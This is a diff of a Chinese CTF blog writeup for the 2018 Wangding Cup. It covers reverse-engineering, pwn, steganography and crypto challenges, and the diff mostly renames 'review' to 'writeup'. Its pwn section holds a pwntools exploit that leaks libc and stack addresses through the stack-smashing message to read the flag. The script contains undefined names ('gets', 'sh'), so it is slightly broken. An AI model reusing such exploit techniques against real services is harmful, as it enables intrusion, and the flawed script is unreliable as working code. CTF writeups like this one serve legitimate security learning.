@@ -3,34 +3,34 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>2018-网鼎杯-review | AssassinQ</title>
+  <title>2018-网鼎杯-writeup | AssassinQ</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="keywords" content="ctfreview">
+  <meta name="keywords" content="ctfwp">
   
   
   
   
   <meta name="description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
-<meta name="keywords" content="ctf,review">
+<meta name="keywords" content="ctf,wp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018-网鼎杯-review">
+<meta property="og:title" content="2018-网鼎杯-writeup">
 <meta property="og:url" content="https://qianfei11.github.io/2018/09/12/2018-网鼎杯-review/index.html">
 <meta property="og:site_name" content="AssassinQ">
 <meta property="og:description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/blend/1.png">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/blend/2.png">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/minified/1.PNG">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/minified/2.PNG">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/minified/3.PNG">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/welcome/1.png">
-<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/shanghai/1.png">
-<meta property="og:updated_time" content="2019-02-18T13:16:15.272Z">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/blend/1.png">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/blend/2.png">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/minified/1.PNG">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/minified/2.PNG">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/minified/3.PNG">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/welcome/1.png">
+<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/shanghai/1.png">
+<meta property="og:updated_time" content="2019-03-31T09:50:50.572Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018-网鼎杯-review">
+<meta name="twitter:title" content="2018-网鼎杯-writeup">
 <meta name="twitter:description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
-<meta name="twitter:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-review/blend/1.png">
+<meta name="twitter:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/blend/1.png">
   
     <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
   
@@ -67,31 +67,9 @@
 
 
   
-  
-  <div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
 
 
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+<header id="allheader" class="site-header" role="banner">
   <div class="clearfix container">
       <div class="site-branding">
 
@@ -142,7 +120,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      2018-网鼎杯-review
+      2018-网鼎杯-writeup
     </h1>
   
 
@@ -198,9 +176,9 @@
 </tbody>
 </table>
 <p>先是判断字符串长度是否大于19：</p>
-<p><img src="/pics/2018-网鼎杯-review/blend/1.png" alt="判断字符串长度"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/blend/1.png" alt="判断字符串长度"></p>
 <p>然后在循环中逐个比较：</p>
-<p><img src="/pics/2018-网鼎杯-review/blend/2.png" alt="循环check"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/blend/2.png" alt="循环check"></p>
 <p>在循环中，主要是<code>pshufd</code>指令的操作：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffff00  0xffffffffffffff00</span><br><span class="line">0xffffffffffff00ff  0xffffffffffff00ff</span><br><span class="line">0xffffffffff00ffff  0xffffffffff00ffff</span><br><span class="line">0xffffffff00ffffff  0xffffffff00ffffff</span><br><span class="line">0xffffff00ffffffff  0xffffff00ffffffff</span><br><span class="line">0xffff00ffffffffff  0xffff00ffffffffff</span><br><span class="line">0xff00ffffffffffff  0xff00ffffffffffff</span><br><span class="line">0x00ffffffffffffff  0x00ffffffffffffff</span><br></pre></td></tr></table></figure>
 <p>然后与内存中的数据相与，再通过<code>psadbw</code>指令进行绝对差求和。</p>
@@ -226,9 +204,9 @@
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./guess'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.90.160'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">buf = <span class="number">0x7fffffffe4d0</span></span><br><span class="line">argv_0 = <span class="number">0x7fffffffe5f8</span></span><br><span class="line">offset1 = argv_0 - gets</span><br><span class="line">offset2 = <span class="number">0x7ffd12119a88</span> - <span class="number">0x7ffd12119920</span></span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>] <span class="comment"># 0x602058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got ==&gt; libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">gets_got = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(gets_got)</span><br><span class="line">libc_base = gets_got - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ==&gt; environ ==&gt; stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'B'</span> * offset1 + p64(stack - offset2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>取出Alpha0和Green0通道的图片后异或得到flag。</p>
-<p><img src="/pics/2018-网鼎杯-review/minified/1.PNG" alt="Alpha0"></p>
-<p><img src="/pics/2018-网鼎杯-review/minified/2.PNG" alt="Green0"></p>
-<p><img src="/pics/2018-网鼎杯-review/minified/3.PNG" alt="flag"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/minified/1.PNG" alt="Alpha0"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/minified/2.PNG" alt="Green0"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/minified/3.PNG" alt="flag"></p>
 <h2 id="双色块"><a href="#双色块" class="headerlink" title="双色块"></a>双色块</h2><p>先上binwalk得到图片，key为ctfer2333。</p>
 <p>尝试把gif每一个帧拼凑成图片，发现无法得到一个正常的二维码。</p>
 <p>再猜测将紫色与绿色色块分别表示1和0，先提取出每张图片：</p>
@@ -237,9 +215,9 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">        line = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">            file_name = <span class="string">'frame/'</span> + str(i * <span class="number">24</span> + j + <span class="number">1</span>) + <span class="string">'.png'</span></span><br><span class="line">            x = j * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            y = i * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            img = Image.open(file_name)</span><br><span class="line">            img = img.convert(<span class="string">'RGB'</span>) </span><br><span class="line">            img_array = img.load()</span><br><span class="line">            r, g, b = p = img_array[x, y]</span><br><span class="line">            <span class="keyword">if</span> g == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'0'</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">8</span>:</span><br><span class="line">                ret += chr(int(line, <span class="number">2</span>))</span><br><span class="line">                line = <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <p>去掉得到的字符串后面的hhhhh，因为明显不像加密后的内容，尝试base64无果后，用DES解密，密钥即为一开始得到的ctfer2333，得到flag。</p>
 <h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>解压后用cat把所有的文件合并，得到一个zip文件，爆破密码得到flag。</p>
-<p><img src="/pics/2018-网鼎杯-review/welcome/1.png" alt="爆破结果"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/welcome/1.png" alt="爆破结果"></p>
 <h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="shanghai"><a href="#shanghai" class="headerlink" title="shanghai"></a>shanghai</h2><p>维吉尼亚解密，<a href="https://guballa.de/vigenere-solver" target="_blank" rel="noopener">在线解密</a>，直接得到flag。</p>
-<p><img src="/pics/2018-网鼎杯-review/shanghai/1.png" alt="flag"></p>
+<p><img src="/pics/2018-网鼎杯-writeup/shanghai/1.png" alt="flag"></p>
 <p>同时还得到密钥是icqvigenere。</p>
 <h2 id="apl"><a href="#apl" class="headerlink" title="apl"></a>apl</h2><p>之前PladCTF有<a href="https://monosource.github.io/writeup/2018/05/08/plaidctf-aplunatics/" target="_blank" rel="noopener">一道类似的题目</a>，在xman的时候也分析过。</p>
 <p>apl最大的特点是从右往左计算。<code>⍵</code>代表右侧的变量，<code>α</code>代表左侧的变量。</p>
@@ -260,7 +238,7 @@
       
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/review/">review</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>
 
       
         
@@ -299,7 +277,7 @@
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          2018-护网杯-review
+          2018-护网杯-writeup
         
       </div>
     </a>
@@ -367,9 +345,6 @@
 
 
     <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
     
     
 </script>
